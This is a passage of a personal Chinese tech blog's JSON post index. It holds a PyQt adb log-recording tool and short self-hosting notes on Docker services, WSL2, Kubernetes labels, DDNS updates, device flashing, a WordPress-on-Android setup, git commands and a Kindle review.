&quot;-s&quot;, self.device, &quot;shell&quot;, &quot;echo&quot;, &quot;connected&quot;]) if os.name == 'nt': startupinfo = subprocess.STARTUPINFO() startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW startupinfo.wShowWindow = subprocess.SW_HIDE else: startupinfo = None name = &quot;root&quot; password = &quot;*************&quot; self.process = subprocess.Popen([&quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;-s&quot;, self.device, &quot;shell&quot;], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,startupinfo=startupinfo, encoding=&quot;utf-8&quot;, universal_newlines=True) # self.wait() # print(self.stdout.read()) # print(&quot;输入用户名&quot;) time.sleep(3) self.process.stdin.write(name + '\\n') self.process.stdin.flush() # # print(&quot;输入密码&quot;) time.sleep(3) self.process.stdin.write(password + '\\n') self.process.stdin.flush() self.connect_button.setEnabled(False) self.disconnect_button.setEnabled(True) self.record_button.setEnabled(True) self.case_edit.setEnabled(True) self.ocpplog_button.setEnabled(True) except subprocess.CalledProcessError: QMessageBox.warning(self, &quot;警告&quot;, &quot;连接设备失败&quot;) def disconnect_device(self): # 断开设备 self.device = None self.connect_button.setEnabled(True) self.stop_button.setEnabled(False) self.stop_record() self.case_edit.setEnabled(False) self.record_button.setEnabled(False) self.ocpplog_button.setEnabled(False) self.disconnect_button.setEnabled(False) def offline(self): # 获取端口和波特率输入框中的值 self.port = self.atport_edit.text() if not self.port: QMessageBox.warning(self, &quot;警告&quot;, &quot;请输入AT COM口如‘COM19’&quot;) return # 执行离线命令 ser_obj = ser.Serial(port=self.port, baudrate=115200) ser_obj.write(&quot;AT+CFUN=4\\r&quot;.encode()) self.online_button.setEnabled(True) self.offline_button.setEnabled(False) def online(self): # 获取端口和波特率输入框中的值 self.port = self.atport_edit.text() if not self.port: QMessageBox.warning(self, &quot;警告&quot;, &quot;请输入AT COM口如‘COM19’&quot;) return # 执行在线命令 ser_obj = ser.Serial(port=self.port, baudrate=115200) ser_obj.write(&quot;AT+CFUN=1\\r&quot;.encode()) self.online_button.setEnabled(False) self.offline_button.setEnabled(True) def connect_hmi(self): # 检查设备状态 if os.name == 'nt': startupinfo = subprocess.STARTUPINFO() startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW startupinfo.wShowWindow = subprocess.SW_HIDE else: startupinfo = None hmi_devices = self.get_devices() print(hmi_devices) if '192.168.1.80:5555' in hmi_devices: # 设备已连接，直接启动scrcpy cmd = '.\\scrcpy-win64-v1.25\\scrcpy.exe -s 192.168.1.80 --always-on-top --max-size 640 --lock-video-orientation=2' self.process = subprocess.Popen(cmd, shell=True, encoding=&quot;utf-8&quot;,startupinfo=startupinfo) else: # 设备未连接，先连接设备再启动scrcpy # cmd = &quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;connect&quot; &quot;192.168.1.80&quot; self.process = subprocess.Popen([&quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;connect&quot;, &quot;192.168.1.80&quot;], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding=&quot;utf-8&quot;, universal_newlines=True,startupinfo=startupinfo) time.sleep(5) cmd = '.\\scrcpy-win64-v1.25\\scrcpy.exe -s 192.168.1.80 --always-on-top --max-size 640 --lock-video-orientation=2' self.process = subprocess.Popen(cmd, shell=True, encoding=&quot;utf-8&quot;,startupinfo=startupinfo) def start_record(self): # 开始录制 self.case_name = self.case_edit.text().strip() if not self.case_name: QMessageBox.warning(self, &quot;警告&quot;, &quot;请输入日志名&quot;) return if self.logcat_process or self.ocpplog_process: QMessageBox.warning(self, &quot;警告&quot;, &quot;正在录制中&quot;) return # 创建以当前日期为名字的文件夹 current_date = datetime.datetime.now().strftime(&quot;%Y-%m-%d&quot;) self.log_folder = os.path.join(os.getcwd(), &quot;Log&quot;, current_date) if not os.path.exists(self.log_folder): os.makedirs(self.log_folder) logcat_file = os.path.join(self.log_folder, self.get_logcat_file()) ocpplog_file = os.path.join(self.log_folder, self.get_ocpplog_file()) netlog_file = os.path.join(self.log_folder, self.get_netlog_file()) if os.name == 'nt': startupinfo = subprocess.STARTUPINFO() startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW startupinfo.wShowWindow = subprocess.SW_HIDE else: startupinfo = None self.logcat_process = subprocess.Popen([&quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;-s&quot;, self.device, &quot;logcat&quot;, &quot;-s&quot;, &quot;TBoxService &quot;], stdout=open(logcat_file, &quot;wb&quot;), startupinfo=startupinfo) self.ocpplog_process = subprocess.Popen([&quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;-s&quot;, self.device, &quot;shell&quot;, &quot;/oemapp/bin/ocppCli&quot;], stdout=open(ocpplog_file, &quot;wb&quot;), startupinfo=startupinfo) if self.net_capture_enable.isChecked(): # print(&quot;开始录制以太网报文&quot;) net_dict = self.initInterfaceDict() net_device = self.net_device_combo.currentText() net_id = net_dict[net_device] tshark_path = self.getConfigValue(&quot;tshark_path&quot;) cmd = f'{tshark_path} -i {net_id} -w &quot;{netlog_file}&quot;' print(cmd) self.net_capture_process = subprocess.Popen(cmd,startupinfo=startupinfo) self.record_button.setEnabled(False) self.stop_button.setEnabled(True) self.case_edit.setEnabled(False) self.disconnect_button.setEnabled(False) def stop_record(self): # 停止录制 if self.logcat_process: self.logcat_process.terminate() self.logcat_process.wait() self.logcat_process = None if self.ocpplog_process: self.ocpplog_process.terminate() self.ocpplog_process.wait() self.ocpplog_process = None if self.net_capture_process: self.net_capture_process.terminate() self.net_capture_process.wait() self.net_capture_process = None self.record_button.setEnabled(True) self.stop_button.setEnabled(False) self.case_edit.setEnabled(True) self.disconnect_button.setEnabled(True) def get_logcat_file(self): # 获取logcat文件名 base_name = &quot;logcat_&quot; + self.case_name + &quot;.log&quot; index = 1 while os.path.exists(os.path.join(self.log_folder, base_name)): base_name = &quot;logcat_&quot; + self.case_name + &quot;_&quot; + str(index) + &quot;.log&quot; index += 1 return base_name def get_ocpplog_file(self): # 获取ocpplog文件名 base_name = &quot;ocpplog_&quot; + self.case_name + &quot;.log&quot; index = 1 while os.path.exists(os.path.join(self.log_folder, base_name)): base_name = &quot;ocpplog_&quot; + self.case_name + &quot;_&quot; + str(index) + &quot;.log&quot; index += 1 return base_name def get_netlog_file(self): # 获取netlog文件名 base_name = &quot;netlog_&quot; + self.case_name + &quot;.pcapng&quot; index = 1 while os.path.exists(os.path.join(self.log_folder, base_name)): base_name = &quot;netlog_&quot; + self.case_name + &quot;_&quot; + str(index) + &quot;.pcapng&quot; index += 1 return base_name def open_ocpp(self): # os.system(' start cmd.exe /K ./scrcpy-win64-v1.25/adb.exe -s b286526e shell /oemapp/bin/ocppCli') self.device = self.device_combo.currentText() self.process = subprocess.Popen([&quot;./scrcpy-win64-v1.25/adb.exe&quot;, &quot;-s&quot;, self.device, &quot;shell&quot;, &quot;/oemapp/bin/ocppCli&quot;]) if __name__ == '__main__': app = QApplication(sys.argv) recorder = LogRecorder() recorder.show() sys.exit(app.exec_()) ","link":"https://hellogu.github.io/post/shi-yong-pyqt-kai-fa-yi-ge-gong-zuo-xiao-lu-gong-ju-tbox_log_tool/"},{"title":"Win10 Wsl2安装Ubuntu","content":"wsl --install #使用部署映像服务和管理工具（DISM）来启用Windows子系统Linux功能 dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart #启用虚拟机平台功能 dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart #将WSL的默认版本设置为2 wsl --set-default-version 2 ","link":"https://hellogu.github.io/post/ling-sui-bei-wang-lu/"},{"title":"给K8S集群中的node批量追加标签","content":"Kubectl中好像没有这样批量操作node标签的命令，所以得通过awk来操作了 #过滤出具有xib.desb/mesh=true标签的节点 kubectl get nodes --show-labels | grep xib.desb/mesh=true | awk -F ' ' '{print $1}' &gt; node.txt #给节点添加一个新的标签xib.desb/mesh-control=true for i in $(cat node.txt) ; do kubectl label node $i xib.desb/mesh-control=true ; done ","link":"https://hellogu.github.io/post/gei-k8s-ji-qun-zhong-de-node-pi-liang-zhui-jia-biao-qian/"},{"title":"19块的双速手电钻","content":"能看出来同心度一般，不过19要啥自行车，拧一次家具就回本 ","link":"https://hellogu.github.io/post/19-kuai-de-shuang-su-shou-dian-zuan/"},{"title":"openwrt或软路由中使用docker部署openclash","content":"主程序 docker run -d --name=clash -v &quot;$PWD/config.yaml:/root/.config/clash/config.yaml&quot; -p &quot;7890:7890&quot; -p &quot;9090:9090&quot; --restart=unless-stopped dreamacro/clash 面板 docker run -p 1234:80 -d --rm --name yacd haishanh/yacd docker wol docker run --rm --network host fopina/wakeonlan wake d8:cb:8a:7b:77:a5 ","link":"https://hellogu.github.io/post/openwrt-huo-ruan-lu-you-zhong-shi-yong-docker-bu-shu-openclash/"},{"title":"Docker部署Jenkins","content":"给测试环境部署了一个Jenkins用于简化打包操作，用来用去发现还是使用Docker部署最为方便 docker run \\ -u root \\ -d \\ -p 8080:8080 \\ -p 50000:50000 \\ -v /home/jenkins_home:/var/jenkins_home \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /etc/localtime:/etc/localtime \\ jenkinsci/blueocean ","link":"https://hellogu.github.io/post/docker-bu-shu-jenkins/"},{"title":"使用tmm刮削器获取影视库元数据","content":"之前部署了jellyfin影视库，但由于网络情况经常获取不到影视的元数据信息，试用了一下tmm刮削器发现非常好用，tmm刮削器支持windows安装，但还是使用Docker部署更方便，离线下载完电影后在浏览器中操作刮削一下元数据就行 docker run -d --name=tinymediamanager \\ -v /storage/tmm/config:/config \\ -v /storage/tmm/media:/media \\ -e GROUP_ID=0 -e USER_ID=0 -e TZ=Europe/Madrid \\ -p 5800:5800 \\ -p 5900:5900 \\ romancin/tinymediamanager:latest ","link":"https://hellogu.github.io/post/shi-yong-tmm-gua-xue-qi-huo-qu-ying-shi-ku-yuan-shu-ju/"},{"title":"Docker部署Jellyfin影视库","content":"docker run -d \\ -v /storage/jellyfin/config:/config \\ -v /storage/jellyfin/cache:/cache \\ -v /storage/jellyfin/media:/media \\ --net=host \\ --name=jellyfin \\ --restart=always \\ jellyfin/jellyfin:latest ","link":"https://hellogu.github.io/post/docker-bu-shu-jellyfin-ying-shi-ku/"},{"title":"使用watchtower更新docker容器","content":"watchtower持久运行(运行完成后创建watchtower容器自动更新watchtower.list中的容器) docker run -d \\ --name watchtower \\ -v /var/run/docker.sock:/var/run/docker.sock \\ containrrr/watchtower -c \\ $(cat /opt/watchtower.list) watchtower一次性运行(运行完成后删除watchtower容器) docker run --rm \\ -v /var/run/docker.sock:/var/run/docker.sock \\ containrrr/watchtower -c \\ --run-once \\ qinglong aria2-pro ","link":"https://hellogu.github.io/post/shi-yong-watchtower-geng-xin-docker-rong-qi/"},{"title":"花生壳DDNS强制更新","content":"由于没有固定公网IP，使用花生壳DDNS服务来访问家里的路由器，有时路由器重新拨号了但花生壳没有及时更新IP，所以需要手动强制更新一下 直接在浏览器中输入以下 http://username:password@ddns.oray.com/ph/update?hostname=yourhostname&amp;myip=ipaddress username: 你在花生壳上注册的用户名 password: 你的花生壳密码 hostname: 你在花生壳上申请的域名：如：test.zicp.net myip : 你想更新成的IP地址。（可以不填，如果没有花生壳会直接使用你的出口公网地址） 返回说明： good 更新成功，域名的IP地址已经更新，同时会返回本次更新成功的IP，用空格隔开，如：good 1.2.3.4 nochg 更新成功，但没有改变IP。一般这种情况为本次提交的IP跟上一次的一样 notfqdn 未有激活花生壳的域名 nohost 域名不存在或未激活花生壳 nochg 更新成功，但没有改变IP。一般这种情况为本次提交的IP跟上一次的一样 abuse 请求失败，频繁请求或验证失败时会出现 !donator 表示此功能需要付费用户才能使用，如https ","link":"https://hellogu.github.io/post/hua-sheng-ke-ddns-qiang-zhi-geng-xin/"},{"title":"斐讯T1刷机记录","content":"不知不觉已经上了4车斐讯路由器了，前天老爸打电话来说家里的天猫魔盒越来越卡了，立马京东下单又上一车斐讯盒子。 晒一下当年秒的两台1代魔盒斐讯T1刷机记录 我也曾欧过，可惜现在转非了。 接下来就是刷机步骤啦 材料：PC一台，usb公对公一根（两根数据线对剪，剥开线，颜色相同的接一起） 刷机包：恩山论坛，ZNDS论坛均有下载，我这里把yyf的和webpad两位大神的刷机包都试了一下，最后用了webpad的。 本来是要剪两根数据线自己接一下usb公对公的，奈何两根线剪开都只有一黑一红两根线，只能充电不能传输数据，也不知道这两根线是买啥东西送的了，太会抠门了，电烙铁离开学校多年不用早就扔了，只能把usb头钳下来插入4根回形针对付一下了，大家接数据线的时候记得同样颜色接一起！！！ 没有电烙铁，回形针插入也能用，问题不大 接下来就是刷机步骤了！ 打开下载好的刷机软件，先装好驱动 导入刷机包 点击开始后，先将usb插入盒子，连上电脑，再插入电源，电脑识别之后，刷机工具自动开始读条 等待读条完成，进度条显示绿色的100%就是刷机完成了，接下来插上电视机设置完成就可以使用了，刷了webapp的刷机包之后也可以运行一下他帖子里提供的几个精简的命令行文件来将“沙发管家桌面”替换成“当贝桌面”。我这图是已经替换了当贝桌面的。 ","link":"https://hellogu.github.io/post/fei-xun-t1-shua-ji-ji-lu/"},{"title":"旧手机的余热：在安卓手机上部署LNMP+WORDPRESS博客","content":"旧手机的瞎折腾 硬件：安卓手机一台（已root） 软件工具：BusyBox linuxdeploy JuiceSSH secureCRT 思路： 1.搭建linux环境--&gt;在安卓手机上安装BusyBox、linuxdeploy、JuiceSSH 2.部署LNMP--&gt;在linux环境中使用oneinstack工具一键部署LNMP 3.放置wordpress--&gt;将wordpress框架放到部署好的LNMP环境中 4.外网访问--&gt;使用ngrok工具，让你的博客能从外网访问 正文： 自从屏幕坏掉，这个moto x style已经在我抽屉里躺了一年半了，本来拆散了裱起来以示情怀的，偶然间得知还有做成博客这么一种用法便行动了起来，废话不多说，开始了。 第一步： 1.在已经root过的手机上安装BusyBox、linuxdeploy、JuiceSSH这三个APP 2.点开BusyBox，点击安装，弹出root权限确认点击授予。 3.点开linux deploy，先点击右下角的设置，设置好要安装的linux版本，设置完之后，点击右上角的三个点点，点击安装。（我的手机屏幕一半黑了，所以是连着电脑控制着操作的） 具体linux版本和安装的设置可以参考我的： 容器类型：chroot 发行版GUN/Linux：Debian 架构：armhf #最初我选的是arm64，后来想装花生壳的时候发现linux版的x86和x64都不能安装，而适配给树莓派的armhf版可以安装。 发行版GUN/Linux版本：stretch 源地址：[中科大的镜像源](https://mirrors.ustc.edu.cn/debian/) 安装类型：目录 安装路径：保持默认 用户名：自定义 用户密码：自定义 特权用户：root DNS：自动 再下面的勾选启用SSH就行了，挂载Android上的资源以后空间不够了可以给SD卡分区一下挂上去，图形界面想用的也可以启用，基本用不着。 家里联通50M，20分钟不到就部署完了，部署完点击左下角的启动，正常启动完，没报错啥的话，linux就已经装好了，点开另一个软件JuiceSSH，输入ip（这里的192.168.123.233是我随便输的，具体的局域网ip，linuxdeploy这个app打开，显示在最上面一行的就是，要连着家里的wifi，自己的电脑才能连的上，连4G网是连不上的），端口号：22，用户名密码是刚刚自己设置的，不过手机上字太小，不好操作我们用电脑上的SecureCRT或者putty、xshell连接这台手机的局域网IP来操作，这里我用的是secureCRT。 点击连接，输入完密码之后就进入了它的命令行界面。 先设置一下root用户的密码 sudo passwd root #输入回车后再输入两遍密码 su #输入后回车，再输入刚刚设置的密码，切换成root用户 apt-get install vim #安装vim编辑器，需要确认的地方输个Y vim /etc/ssh/sshd_config #编辑ssh设置文件，打开root用户的远程登陆权限 找到PermitRootLogin 这一样，按Shift+I键进入编辑，将PermitRootLogin前面的“#”删掉，后面的改成yes，如图 然后按一下Esc键，输入:wq!后回车，注意有个冒号。 好了，接下来就直接用root用户登陆，不用先登陆admin再切换到root了 接下来安装nginx，php，mysql，可以一次性输入安装命令 apt-getinstall nginx php7.0-fpm mysql-server-5.7 php7.0-mysql 装完之后启动服务 service nginx start service php7.0-fpm start service mysql start #我这里MySQL启动失败，输入 usermod -a -G aid_net_raw mysql后再次输入启动mysql的命令 然后配置一下nginx的配置文件 vim/etc/nginx/sites-available/default #修改两个，增加一个index.php格式支持，把关于php7.0-fpm的注释去掉 装一下防火墙并打开80和3306端口 apt-get install ufw #安装防火墙 ufw allow 3306 #打开3306端口 数据库远程 ufw allow 80 #打开80端口 然后重启一下服务 service nginx restart services php7.0-fpm restart 然后电脑打开浏览器访问 http://（你的手机的局域网ip）比如192.168.123.233 查看是否有welcome to nginx！的提示 然后下载wordpress上传到linux系统的 /var/www/html 路径下（这个路径在上面修改的那个文件里也可以改）,进入wordperss官网，找到下载Wordpress按钮 ，先放到本地电脑的随便哪里，比如说D:/Download这里 下载.zip或者.tar.gz格式的都可以，只是一会儿解压的命令不同 点击SecureCRT左上角的File--&gt;Connect SFTP session，右边会出来一个sftp窗口 在stfp窗口输入 cd /opt/ #表示进入linux的opt目录 lcd D:/Download/ #表示进入本计算机的D:/Download （刚刚存放wordpress压缩包的路径） put wordpress-4.9.1-zh_CN.tar.gz #将此压缩包由本地推送到linux的指定目录 然后回到左边的linux命令行 cd /var/www/html/ #进入nginx配置文件中定义的网站根目录 ls #可以输入ls查看一下有没有拷进来 tar zxf wordpress-4.9.1-zh_CN.tar.gz # 解压命令，这里我解压过了就不演示了，CTRL+C键是取消当前命令 然后浏览器访问http://192.168.123.233（你的手机的局域网ip）/wordpress 能看到wordpress的安装引导，我已经安装过了，就网上截了个图给大家看一下 接下来先不急着安装，我们得先准备这个页面上所说的数据库用户信息 mysql -u root # 以root用户登陆mysql数据库，这里之前apt-get install mysql的过程中如果让设置了密码，就要输入 mysql -u root -p，然后回车后输入密码，我这里没设置，不输密码就能进入 然后开始进入数据库的操作命令行 CREATE DATABASE wpdb; #创建一个叫wpdb的数据库，这个名字自定义，记得就好，最后有分号不能漏 CREATE USER wpuser@localhost IDENTIFIED BY ‘wppass’; #wpuser和wppass分别是用户名和密码，也可以自定义，注意分号 GRANT ALL PRIVILEGES ON wpdb.* TO wpuser@localhost; #给wpuser操作wpdb的权限，注意分号 FLUSH PRIVILEGES; #立即刷新生效，注意分号 EXIT #退出mysql操作命令行，这个不需要分号 然后重启一下mysql和nginx服务 service mysql restart service nginx restart 然后访问http://192.168.123.233（你的局域网里的手机ip）/wordpress再次进入wordpress的安装界面，根据提示填入刚刚设置的数据库名，数据库用户名，密码，就是下图打码的地方，我已经装好了，这是网上截图的。 然后一直下一步就装完了，再次访问默认主题就是这样的，可以自己去搜个主题装一下哟 后面可能出现一个wordpress无法操作一个contig文件的错误，照着它的提示在本地编辑好，再用sftp上传到/var/www/html/wordpress里就可以了 接下来是使你的博客能从外网访问，可以用花生壳，可以用ngrok，这里我用的是ngrok 打开ngrok 注册一个免费账户，申请一个免费的隧道，并记下隧道id，这里我买了10元钱的付费一个月服务，免费的就可以 域名自定义，这里ngrok可以直接部署在你手机上的linux系统中，也可以部署在路由器中，直接部署在系统中就填127.0.0.1:80用户名密码不用填，部署在路由器上的话，填入路由器给你手机分的ip 192.168.123.233:80，用户名密码和路由器上设置的一样，撸了斐讯路由器的刷个padavan或者荒野无灯的固件就可以设置ngrok了 然后去ngrok的首页下载安装包 然后还是用sftp推送到linux系统里 cd /opt/ #进入目录 chmod -R 777 sunny #给这个文件赋予可执行权限 ./sunny clientid ************ #这里的***是你的隧道id 出现下面页面就是运行成功了，然后访问http://你的前置域名.free.ngrok.cc/wordpress 就可以访问你的博客了，(如果是付费的，是http://前置域名.viphk.ngrok.org/wordpress我的前置域名是lipten哟)（这张图片来自ngrok官方指导） 下面给大家看一下如果是把ngrok运行在路由器上怎么设置，刷了荒野无灯固件和padavan的斐讯路由器可以参考一下 最后，纪念一下我的狗魔 ","link":"https://hellogu.github.io/post/jiu-shou-ji-de-yu-re-zai-an-zhuo-shou-ji-shang-bu-shu-lnmpwordpress-bo-ke/"},{"title":"Git操作备忘","content":"git clone https://github.com/ git add . （注：别忘记后面的.，此操作是把Test文件夹下面的文件都添加进来） git commit -m &quot;提交信息&quot; （注：“提交信息”里面换成你需要，如“first commit”） git push -u origin master （注：此操作目的是把本地仓库push到github上面，此步骤需要你输入帐号和密码） git pull origin master 创建仓库命令 下表列出了 git 创建仓库的命令： 命令 说明 git init 初始化仓库 git clone 拷贝一份远程仓库，也就是下载一个项目 提交与修改 Git 的工作就是创建和保存你的项目的快照及与之后的快照进行对比。 下表列出了有关创建与提交你的项目的快照的命令： 命令 说明 git add 添加文件到暂存区 git status 查看仓库当前的状态，显示有变更的文件。 git diff 比较文件的不同，即暂存区和工作区的差异。 git commit 提交暂存区到本地仓库。 git reset 回退版本。 git rm 将文件从暂存区和工作区中删除。 git mv 移动或重命名工作区文件。 git checkout 分支切换。 git switch （Git 2.23 版本引入） 更清晰地切换分支。 git restore （Git 2.23 版本引入） 恢复或撤销文件的更改。 提交日志 命令 说明 git log 查看历史提交记录 git blame 以列表形式查看指定文件的历史修改记录 远程操作 命令 说明 git remote 远程仓库操作 git fetch 从远程获取代码库 git pull 下载远程代码并合并 git push 上传远程代码并合并 ","link":"https://hellogu.github.io/post/git-cao-zuo-bei-wang-1/"},{"title":"Kindle Paperwhite2 日版晒单","content":"前两天看见同学的499Kindle就想着剁次手了，等了一个礼拜没等到什么力度大的优惠于是决定淘宝入了！，上淘宝一看日版kindle pw2只要718！！！还要什么屌丝版kindle499。 经过两天的紧张等待，我的kindle pw2终于来到了我手中 从左往右分别是套子，kindle，数据线（标配只有一台kindle，一条数据线，说明书保修卡没有充电器）充电器和手机的通用。日版开机语言选择里就有简体中文。 拿到手连上网发现竟然有封面广告！广告其实还好，主要是有个滑动解锁太不方便了，这有什么好解锁的。Kindle Paperwhite2 日版晒单 百度了下知道升级到最新的5.6.1.0.2系统可以在设置里关掉广告。于是立刻去亚马逊官网下载更新。（不过最新系统不能越狱和刷多看） 刷完重启，连上wifi，登上亚马逊账号（我直接登陆的中亚账号） 下面展示下大小 单手握持不嫌重，很轻巧。 背面是涂层的手感，比motox的摸着滑一点 和motox大小对比 顺便注册了狗耳朵，设置了自动推送 ","link":"https://hellogu.github.io/post/kindle-paperwhite2-ri-ban-shai-dan/"}]}